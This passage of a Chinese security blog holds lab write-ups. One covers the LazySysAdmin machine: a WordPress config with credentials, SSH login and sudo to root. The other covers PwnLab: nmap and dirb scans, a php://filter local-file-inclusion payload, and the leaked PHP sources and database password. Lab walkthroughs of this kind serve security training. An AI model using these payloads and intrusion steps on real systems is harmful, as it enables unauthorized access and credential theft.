class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;Admin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TogieMYSQL12345^^&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;SAq-)W,-K9tFcW(=?ro4SJ5)R.mx%+@KL-I@PB&#123;&lt;-i&gt;g3n^1|E&lt;-uN|&#125;F;:PbMYJ&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;u .o%Ld%m27waNqK+*`~&amp;j6~v!d7vI|OwA|hd8%r#ri_`WRIcCN-KiTSWmk)1;xG&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;iX^NN~N7R5Mdmeh:$iLY60r~K[)^f5vk`wGDO30r8Ns)gA17FRt2|$#S!Lq@-&lt;|`&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;,_xAk=+)B7f_a|#J44&#125;qWca!=`s4&#123;C2.Xe&gt;sY%4Ybd5*3z9WRH-ysm=.|Gm^McvU&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;(:^&lt;BWwzWYx ,f^9anxD,+V+2-&amp;,VJ@@)U7CSzjv_MvD67&gt;?05ihCG]Q1K:_7Xsa&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;ud]&#125;&#125;0rWRMGZ+a`Hky G7|i|+c7YyH4=l#5&#123;/1R=|]PYrOmN&#123;&amp;0JuqkO=o5vyGg5&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;=M_DRp%vGmijIhl%K!(v&gt;:,*RR&lt;cl9ahav%&#123;q`&amp;I/0HD/$W/LK:mxR37PKh?Zzi8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;ABOgE&gt;G:U;Q/hO^&gt;jBG5e96OL6+&#123;=mV,|2S~c,~dhVa!E/&amp;Q[Mc8#IgVTuXAI&#125;sY&#x27;</span>);</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span>  = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the Codex.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy blogging. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>) )</span><br><span class="line">	<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dynamic site URL added by Togie */</span></span><br><span class="line"><span class="variable">$currenthost</span> = <span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line"><span class="variable">$currentpath</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@/+$@&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]));</span><br><span class="line"><span class="variable">$currentpath</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\/wp.+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$currentpath</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_HOME&#x27;</span>,<span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_SITEURL&#x27;</span>,<span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_URL&#x27;</span>, <span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>.<span class="string">&#x27;/wp-content&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_PLUGIN_URL&#x27;</span>, <span class="variable">$currenthost</span>.<span class="variable">$currentpath</span>.<span class="string">&#x27;/wp-content/plugins&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DOMAIN_CURRENT_SITE&#x27;</span>, <span class="variable">$currenthost</span>.<span class="variable">$currentpath</span> );</span><br><span class="line">@<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ADMIN_COOKIE_PATH&#x27;</span>, <span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>访问http://172.17.135.63/wordpress/ 得到提示,my name is togie.</p><p>ssh链接<code>ssh togie@172.17.135.63</code>密码<strong>12345</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ cd </span><br><span class="line">-rbash: cd: restricted</span><br></pre></td></tr></table></figure>切换至bash<p></p><p><code>sudo -s</code>提权到root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ sudo -s</span><br><span class="line">[sudo] password for togie: </span><br><span class="line">root@LazySysAdmin:~# whoami</span><br><span class="line">root</span><br><span class="line">root@LazySysAdmin:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p></p><p>root依然默认使用rbash切换到bash,但是从passwd中看是bash,但是就是不能用cd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@LazySysAdmin:/root<span class="comment"># cat proof.txt </span></span><br><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ<span class="comment">#PT9851</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Well <span class="keyword">done</span> :)</span><br><span class="line"></span><br><span class="line">Hope you learn<span class="string">&#x27;t a few things along the way.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Togie Mcdogie</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enjoy some random strings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span></span><br><span class="line"><span class="string">2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7</span></span><br><span class="line"><span class="string">pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02</span></span><br><span class="line"><span class="string">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/%E9%9D%B6%E5%9C%BA71/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/%E9%9D%B6%E5%9C%BA71/" class="post-title-link" itemprop="url">靶场71</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-23 21:05:15" itemprop="dateCreated datePublished" datetime="2019-05-23T21:05:15+08:00">2019-05-23</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-06-24 05:43:06" itemprop="dateModified" datetime="2022-06-24T05:43:06+08:00">2022-06-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="靶场71">靶场71</h1><p>nmap扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 172.17.135.71 -sS -Pn -O</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-23 21:03 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.71</span><br><span class="line">Host is up (0.0034s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.6</span><br><span class="line">Network Distance: 3 hops</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.27 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>dirb扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://172.17.135.71 ctf/dir/php.txt </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu May 23 21:12:43 2019</span><br><span class="line">URL_BASE: http://172.17.135.71/</span><br><span class="line">WORDLIST_FILES: ctf/dir/php.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 3355                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.71/ ----</span><br><span class="line">+ http://172.17.135.71//index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../ (CODE:200|SIZE:332)                                                                          </span><br><span class="line">+ http://172.17.135.71//index.php (CODE:200|SIZE:332)                                                                                                                                          </span><br><span class="line">+ http://172.17.135.71//config.php (CODE:200|SIZE:0)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.71//login.php (CODE:200|SIZE:250)                                                                                                                                          </span><br><span class="line">+ http://172.17.135.71//upload.php?action=upfile (CODE:200|SIZE:19)                                                                                                                            </span><br><span class="line">+ http://172.17.135.71//upload.php (CODE:200|SIZE:19)                                                                                                                                          </span><br><span class="line">+ http://172.17.135.71//upload/ (CODE:200|SIZE:4774)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.71//../admin (CODE:400|SIZE:305)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.71//../admin.php (CODE:400|SIZE:305)                                                                                                                                       </span><br><span class="line">+ http://172.17.135.71//../admin/default (CODE:400|SIZE:305)                                                                                                                                   </span><br><span class="line">+ http://172.17.135.71//../admin/default.php (CODE:400|SIZE:305)                                                                                                                               </span><br><span class="line">+ http://172.17.135.71//../admin/index (CODE:400|SIZE:305)                                                                                                                                     </span><br><span class="line">+ http://172.17.135.71//../admin/index.php (CODE:400|SIZE:305)                                                                                                                                 </span><br><span class="line">+ http://172.17.135.71//../admin/login (CODE:400|SIZE:305)                                                                                                                                     </span><br><span class="line">+ http://172.17.135.71//../admin/login.php (CODE:400|SIZE:305)                                                                                                                                 </span><br><span class="line">+ http://172.17.135.71//../admin/manage (CODE:400|SIZE:305)                                                                                                                                    </span><br><span class="line">+ http://172.17.135.71//../admin/manage.php (CODE:400|SIZE:305)                                                                                                                                </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu May 23 21:12:51 2019</span><br><span class="line">DOWNLOADED: 3355 - FOUND: 17</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ dirb http://172.17.135.71 ctf/dir/dir.txt </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu May 23 21:13:38 2019</span><br><span class="line">URL_BASE: http://172.17.135.71/</span><br><span class="line">WORDLIST_FILES: ctf/dir/dir.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 1170                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.71/ ----</span><br><span class="line">+ http://172.17.135.71//images/ (CODE:200|SIZE:942)                                                                                                                                            </span><br><span class="line">+ http://172.17.135.71//upload (CODE:301|SIZE:315)                                                                                                                                             </span><br><span class="line">+ http://172.17.135.71//images (CODE:301|SIZE:315)                                                                                                                                             </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu May 23 21:13:41 2019</span><br><span class="line">DOWNLOADED: 1170 - FOUND: 3</span><br></pre></td></tr></table></figure><p></p><p>可疑位置 <code>http://172.17.135.71/index.php?page=login</code> 这里指定了一个页面,尝试指定伪协议 伪协议学习<code>https://lorexxar.cn/2016/09/14/php-wei/</code> <code>http://172.17.135.71/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code> 没有结果,因为上面使用的是页面名<code>?page=login</code>,所以使用<code>php://filter/read=convert.base64-encode/resource=index</code></p><h3 id="index.php">index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Multilingual. Not implemented yet.</span></span><br><span class="line"><span class="comment">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;lang/&quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Not implemented yet.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href=<span class="string">&quot;/&quot;</span>&gt;Home&lt;/a&gt; ] [ &lt;a href=<span class="string">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; ] [ &lt;a href=<span class="string">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Use this server to upload and share image files inside the intranet&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="login">login</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$luser</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	<span class="variable">$lpass</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;</span>);</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$luser</span>, <span class="variable">$lpass</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_Result</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;num_rows == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$luser</span>;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=upload&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Login failed.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">	&lt;label&gt;Username: &lt;/label&gt;&lt;input id=<span class="string">&quot;user&quot;</span> type=<span class="string">&quot;test&quot;</span> name=<span class="string">&quot;user&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">	&lt;label&gt;Password: &lt;/label&gt;&lt;input id=<span class="string">&quot;pass&quot;</span> type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pass&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span>&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="config">config</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$server</span>	  = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;H4u%QJ_H99&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;Users&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="upload">upload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 